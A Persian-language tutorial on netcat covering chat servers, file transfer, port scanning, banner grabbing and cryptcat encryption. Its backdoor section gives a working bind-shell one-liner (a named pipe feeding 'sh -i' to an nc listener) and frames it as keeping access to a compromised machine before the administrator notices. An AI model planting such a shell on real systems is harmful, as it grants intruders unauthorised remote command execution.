---
title: "netcat"
date: 2021-12-02T00:06:44+03:30
draft: false
---

[![netcat](nc.png)](nc.png)

<div dir='rtl'>

### فهرست

> - [مرور](#مرور)
> - [مفاهیم پیشنیاز](#مفاهیم-پیشنیاز)
> - [درست کردن چت سرور](#درست-کردن-چت-سرور)
> - [اتصال به یک پورت خاص](#اتصال-به-یک-پورت-خاص)
> - [انتقال فایل](#انتقال-فایل)
> - [اسکن کردن پورت](#اسکن-کردن-پورت)
> - [banner grabing](#banner-grabing)
> - [درست کردن درب پشتی](#درست-کردن-درب-پشتی)
> - [رمزنگاری ارتباط](#رمزنگاری-ارتباط)
> - [سوییچ های پر استفاده](#سوییچ-های-پر-استفاده)
> - [Author or Authors](#author-or-authors)

---

### مرور
ابزار
netcat
ابزار ساده‌ای است که می‌تواند داده ها را تحت شبکه بنویسد و با بخواند.
netcat
یک ابزار شبکه است که هکر ها بسیار طرفدار آن‌اند و البته این ابزار با تمامی قابلیت هایش
بسیار سبک است.
netcat
اجازه می‌دهد دو کامپیوتر توسط پروتکل های
tcp, udp
در لایه
ip،
به یکدیگر داده ارسال کنند.
netcat 
می‌تواند هم به عنوان
client
و هم
server
عمل کند. برخی از کار های معمولی این ابزار عبارتند از: استفاده به عنوان *پیامرسان،*
*ارسال فایل*، *اسکن پورت* و 
*banner grabing*.

---

### مفاهیم پیشنیاز
چند مفهوم وجود دارد که احتمالا بلدش هستید، اما بد نیست مروری به این مفاهیم داشته باشیم.

> 1. **Ip**
>
> همانطور که می‌دانید ما از چند نوع 
> ip
> برای 
> شنود استفاده می‌کنیم، مثلا وقتی درحال شنود روی یک پورت هستید ممکن است نیاز داشته باشید که
> این پورت فقط برای ای‌پی های لوکال قابل دسترسی باشد
> از این رو باید فقط از ای‌پی لوکال خود استفاده کنید، با دستور
> `ipconfig`
> می‌توانید ای‌پی لوکال خودتون رو ببینید، این ای‌پی ها معمولا با این اعداد شروع می‌شوند:
> `10.x.x.x`
> یا
> `172.16.x.x`
> و یا
> `192.168.x.x`
> و خب اگر شما نیاز دارید تا شنود محدود به ای‌پی لوکال نشود کافیست ای‌پی را به این 
> ای‌پی تنظیم کنید
> `0.0.0.0`

> 2. **Cypher**
>
> یادتون باشه که
> netcat
> هیچ رمزنگاری روی داده ها انجام نمی‌دهد.

> 3. **Port**
>
> در شبکه، پورت های زیر 1024 همه رزرو شده هستند، سعی کنید از این پورت ها استفاده نکنید
> و یا اگر مجبور به استفاده از این پورت ها هستید، حتما باید با دسترسی روت
> netcat 
> را اجرا کنید.

> 4. **TCP/UDP**
>
> در حالت پیشفرض
> netcat
> از پروتکل
> TPC
> برای اتصال استفاده می‌کند. برای تغییر این پورتکل به
> UDP
> باید از سوییچ
> `-u`
> استفاده کنید. فراموش نکنید که این سوییچ را باید برای هم سرور و هم کلاینت
> به کار ببرید. درواقع هر دو باید از یک پروتکل یکسان استفاده کنند.

---

### درست کردن چت سرور
برای درست کردن یک چت سرور به دو مفهوم 
**کلاینت** 
و
**سرور**
نیاز داریم. اول بریم سراغ سرور، ما قراره بین دو کامپیوتر
چت کنیم، یکی از کامپیوتر ها روی یک پورت خاص شروع به شنود می‌کنه.
برای درست کردن سرور این دستور را وارد کنید

```bash
nc -l 0.0.0.0 1337
```

این دستور روی پورت 1337 از هر نوع ای‌پی که باشد، یک کانکشن رو قبول می‌کنه
سوییچ
`-l`
مشخص می‌کند که
netcat
باید باید
listener(شنونده)
باشد.

به زبان ساده‌تر، یکی از سیستم ها برای یک اتصال از یک سیستم
منتظز می‌ماند. کلاینت باید با دادن ای‌پی سرور به 
netcat،
به سرور متصل شود.
برای اینکه کلاینت را به سرور متصل کنیم، فرض کنید ای‌پی لوکال سرور
`192.168.1.2`
است، حال در سیستم کلاینت این دستور را برای اتصال به سرور وارد می‌کنیم

```bash
nc 192.168.1.2 1337
```

این دستور برای
nc
مشخص می‌کند که باید به پورت 1337 سیستمی با آدرس ای‌پی 192.168.1.2
متصل شود. 

> **نکته**:
> بهتره است
> از سوییچ 
> `v-`
> برای حالت
> *verbose*
> استفاده کنید، این سوییچ باعث میشه تا لاگ رخداد ها را ببینید، برای مثلال اگر سیستمی 
> کانکت شد
> و یا به دلیلی اتصال یک سیستم قطع شد، یک خروجی متنی نمایش داده می‌شود

---

### اتصال به یک پورت خاص
همانطور که در دستورات قبلی مشاهده کردیم، متصل شدن به یک پورت مشخص
دو ورودی می‌گیرد، اولی برای مشخص کردن ای‌پی سرور و دومین ورودی پورت را مشخص
می‌کند. برای مثال برای متصل شدن به سیستمی با ای‌پی **192.168.1.1** و پورت **23**

```bash
nc 192.168.1.1 23
```

> **نکته:**
> این پروت پیشفرض 
> telnet
> است، اگر سیستم یا روتر شما از این پروتکل استفاده می‌کند، شما با وارد کردن
> این دستور درواقع شما به سیستم
> telnet
> کرده اید.

---

### انتقال فایل
انتقال فایل با
netcat
یکی از پرکاربرد ترین کار ها برای من بوده، چرا که توی شرکت و حتی در
خانه نیازی به نصب و استفاده از ابزار های دیگه ای نداشتم.

اولین قدم این است که سیستمی که قرار است فایل را دریافت کند را تبدیل به یک سرور کنیم.
netcat
به صورت پیشفرض تمامی دیتایی که دریافت می‌کند را سعی می‌کند در خروجی چاپ کند،
اما فایل ها که به درستی در خروجی چاپ نمی‌شود، ما نیاز داریم تا فایل را ذخیره کنیم.
برای ذخیره داده های دریافتی کافیت از دستور ریدایرکت استفاده کنیم.

```bash
nc -lv 0.0.0.0 1337 > fileName.jpg
```

علامت
`>`
دستور ریدایرکت است که بعد از دستور 
netcat
قرار داده‌ایم، و بعد از این علامت باید یک نام دلخواه به فایل بدهیم، ولی سعی کنید پسوند
فایل را درست وارد کنید.

کلاینت برای ارسال فایل به این سرور باید فایل را بخواند و سپس آن را به 
netcat
پایپ کند.

برای خواندن فایل از دستور 
`cat`
استفاده می‌کنیم. پایپ کردن به این معنی است که خروجی یک دستور را به عنوان ورودی
به یک دستور دیگر بدهیم.
توی این مورد ما فایل
jpg
را می‌خوانیم و آن را به سرور ارسال می‌کنیم. فرض کنید ای‌پی سرور 192.168.1.2.
و نام فایل عکس ما
image.jpg
است.

```bash
cat image.jpg | nc -v 192.168.1.2 1337
```

علامت 
`|`
همان دستور پایپ است.

> **نکته:**
>  برای اینکه سرعت ارسال و حجم ارسال شده داده را در لحظه ببینید از دستور
> pv
> استفاده کنید. به زبان ساده تر خروجی دستور اول را به
> pv
> و خروجی 
> pv
> را به 
> nc
> پایپ کنید

```bash
cat image.jpg | pv | nc -v 192.168.1.2 1337
```

---

### اسکن کردن پورت
این کار برای این است که چک کنیم چه پورت هایی از سیستم باز است.
برای مثال برای این که ببینیم پورت 80 سرور گوگل باز است یا نه،
دامنه
google.com
را به
`nc -z`
می‌دهیم تا چک کند که آیا پورت 80 این سرور باز است یا خیر.
این نکته را بخاطر داشته باشید که در حالت عادی این سویچ هیچ خروجی ندارد،
و ما باید با استفاده از سوییچ
`-v`
خروجی را ببینیم.

```bash
nc -vz google.com 80
```

در صورتی که پورت باز باشد خروجی به این شکل است
```bash
Connection to google.com (142.250.186.174) 80 port [tcp/http] succeeded!
```

اما اگر شما می‌خواید یک محدوده خاصی از پورت های یک سرور را چک کنید باید از علامت
`-`
بین پورت ها استفاده کنید.

برای مثال من پورت های 21 تا 80 سیستم خودم را چک می‌کنم

```bash
nc -zv 127.0.0.1 21-80
```

و در خروجی

```bash
Connection to 127.0.0.1 21 port [tcp/*] succeeded!
Connection to 127.0.0.1 22 port [tcp/*] succeeded!
nc: connect to 127.0.0.1 port 23 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 24 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 25 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 26 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 27 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 28 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 29 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 30 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 31 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 32 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 33 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 34 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 35 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 36 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 37 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 38 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 39 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 40 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 41 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 42 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 43 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 44 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 45 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 46 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 47 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 48 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 49 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 50 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 51 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 52 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 53 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 54 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 55 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 56 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 57 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 58 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 59 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 60 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 61 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 62 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 63 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 64 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 65 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 66 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 67 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 68 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 69 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 70 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 71 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 72 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 73 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 74 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 75 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 76 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 77 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 78 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 79 (tcp) failed: Connection refused
Connection to 127.0.0.1 80 port [tcp/*] succeeded!
```

در این خروجی مشاهده می‌کنید که سه تا از پورت های من باز است و دیگر پورت ها
بسته هستند.

> **نکته:**
> سرور ها معمولا فایروال در جلو خود دارند این باعث میشه که وقتی شما درحال برسی
> یک محدوده خاصی از پورت ها هستید، پورت هایی که توسط فایروال بسته شده است 
> زمان زیادی صرف کند تا تیجه را ببینید، و البته که نتیجه درست را نمایش نمی‌دهد
> به این دلیل که 
> netcat
> بخاطر فایروال نتوانسته است بسته بودن و یا باز بودن پروت را تشخیص دهد.
> برای این که زمان کمی‌ صرف پورت های فیلتر شده شود، از سوییچ
> `-w`
> استفاده کنید، این سوییچ مخفف 
> *wait*
> به معنی انتظار است، و در برابر این سوییچ عدد 1  که کمترین زمان انتظار است را قرار
> بدهید.

```bash
nc -znv 127.0.0.1 21-80 -w 1
```

---

### banner grabing
این اصطلاح به این معنی است که با متصل شدن به پورت یک سیستم
تشخیص بدهیم که چه برنامه‌ای و چه نسخه ای از آن برنامه درحال استفاده از پورت است.
این به ما کمک می‌کند تا تشخیص بدهیم که آیا آن برنامه حفره امنیتی دارد و یا اینکه با
تشخیص نوع سرویس آن پورت سعی کنیم به نحوی از آن سرویس سوء استفاده کنیم.

برای مثال روی سیستم من یک سرویس
FTP
درحال اجرا است، هکر برای اینکه برنامه و ورژن سرویس
FTP
من را بدست بیارد، می‌تواند فقط با متصل شدن به پورت 21 این اطلاعات را بدست بیارد

```bash
nc 127.0.0.1 21
```
و خروجی این دستور
```bash
220 (vsFTPd 3.0.3)
```

و یا همچنین من یک سرویس 
SSH
هم اجرا کرده‌ام، برای بدست اوردن اطلاعات آن هم کافیست به پورت
SSH
متصل بشویم.

```bash
nc 127.0.0.1 22
```
و خروجی
```bash
SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1.1
```

---

### درست کردن درب پشتی
درب پشتی
(backdoor)
یک اصطلاح پر کاربرد در دنیای کامپیوتر است. فرض کنید در خانه‌ای هستید که فقط یک راه
ورود و خروج دارد. اگر به هر نحوی این راه مسدود شود، شما دیگر راهی
برای خروج نخواهید داشت.

در دنیای کامپیوتر به اینگونه است که فرض کنید شما به سیستمی نفوذ کرده اید،
ممکن است هر لحظه مدیر سیستم به این اتفاق پی‌ببرد و دسترسی شما را از سیستم قطع کند.
به همین دلیل شما باید قبل از تشخیص مدیر سیستم، یک درب پشتی کار بگذارید. البته
این روش فقط به عنوان درب پشتی نیست، ممکن است شما نیاز داشته باشید تا به صورت موقت یک
remote shell
درست کنید و از سیستم دیگری به آن متصل شوید.

> **نکته:**
> نکته‌ای که باید به آن توجه کنید این است که می‌توانیم با **دو** روش 
> backdoor
> راه اندازی کنیم.
> **straight** 
> و
> **reverse**.
> استفاده از این دو روش بستگی به موقعیت و وضعیت دارد.

در قدم اول سیستم هدف
را مستقیما روی یک پورت مشخص مشغول به شنود می‌کنیم.
به معنای دیگر این سیستم را تبدیل به یک سرور چت ‌می‌کنیم، اما تفاوت در این است 
که بجای نمایش متن هایی که به سرور ارسال می‌شود، آن ها را به عنوان کامند
اجرا می‌کنیم و خروجی را به سمت کلاینت باز می‌گردانیم.

```bash
mkfifo /tmp/evilfun
cat /tmp/evilfun | sh -i 2>&1 | nc -l 0.0.0.0 2100 > /tmp/evilfun
```

> در خط اول ما یک فایلی به نام
> evilfun
> درست کردیم، این نوع فایل ها، فایل 
> fifo(first in first out)
> هستند، درواقع هر داده که وارد این فایل شود در رم ذخیره می‌شود تا زمانی که یک پردازش
> آن محتوا را بخواند، و زمانی که محتوا خوانده شد، آن محتوا از حذف و فایل
> خالی می‌شود.

> **روش وارونه**
>
> استفاده از این روش بسیار مرسوم است، چرا که سیستم های شخص دارای ای‌پی
> استاتیک(ایستا) نیستند و همچنین این سیستم ها پشت روتر قرار دارند 
> که این باعث می‌شود شما نتوانید به پورت های باز سیستم های پشت روتر متصل شوید.
>
> - برای اجرای این روش شما باید
> در سیستم خود شروع به شنود کنید
> و از سیستم هدف به سیستم خود متصل شوید.
> و هر متنی را که از سیستم خود به سیستم هدف ارسال می‌کنید را به 
> bash
> برای اجرا، بدهید.

---

### رمزنگاری ارتباط
استفاده از 
netcat
در شبکه برای ارسال داده های حساس ممکنه است داده شما را به خطر بیاندازد.
netcat
در حالت پیشفرض هیچ رمزنگاری انجام نمی‌دهد، به همین دلیل باید از ابزار و راه هایی 
استفاده کنیم که داده ها را قبل از ارسال رمزنگاری و بعد از دریافت رمزگشایی کند.
راه های متفاوی وجود دارند که یکی از آنها استفاده از ابزار 
**cryptcat**
است. این ابزار با استفاده از 
netcat 
داده ها ارسال می‌کند که به این معنی است که سوییچ های یکسانی دارند.
این ابزار از رمزنگاری متقارنی به اسم
**two fish**
برای رمزنگاری استفاده می‌کند.

> سوییچ
> `-k`
> متفاوت است.
> در 
> cryptcat
> به عنوان key(کلید)
> استفاده می‌شود.

برای انتقال فایل و یا ارسال متن اکثر سوییچ ها یکسان هستند و نحوه
کار کردن با این ابزار تفاوت با
netcat
نمی‌کند. اما برای نمونه یک چت سرور راه اندازی می‌کنیم.

```bash
cryptcat -k passWord -lv -s 192.168.1.2 -p 1337
```

چت سرور ما با رمز
*passWord*
و ادرس آی‌پی *192.168.1.2* 
و روی پورت *1337* درحال شنود است. 

حال باید سمت کلاینت به این پورت متصل شد. برای اینکار تنها تفاوت این است که
باید کلمه عبور را هم علاوه بر آی‌پی و پورت مشخص کنیم.

```bash
cryptcat -k passWord 192.168.1.2 1337
```

> فراموش نکنید
> cryptcat
> بر خلاف 
> netcat.
> روی همه ای‌پی ها(0.0.0.0) شنود می‌کند.


---

### سوییچ های پر استفاده 

1. سوییچ
**`-l`**
برای سیستم سمت سرور استفاده می‌شود. این سوییچ مشخص می‌کند که
سیستم باید شنونده باشد.

2. سوییچ
**`-v`**
برای حالت پر حرف استفاده می‌شود. به این معنا که شما لاگ های رخداد های
مختلف مانند قطع، وصل و ای‌پی و پورت مقصد را خواهید دید.

3. سوییچ
**`-k`**.
قبل از توضح این سوییچ، باید بگم که اگر شما به سیستمی که با
netcat
درحال شنود است متصل شوید و پس از اتمام کار ارتباط خود را قطع کنید،
سیستم درحال شنود هم دیگر شنود نخواهد کرد. برای اینکه سرور همیشه درحال شنود
باقی بماند و پس از پایان ارتباط، همچنان شنود را ادامه بدهد،
در سمت سرور باید از سوییچ
`-k`
استفاده کرد.

---

</div>

### Author or Authors:

- *[Arya](https://github.com/shabane)* | **<m.mohamadshabane@gmail.com>**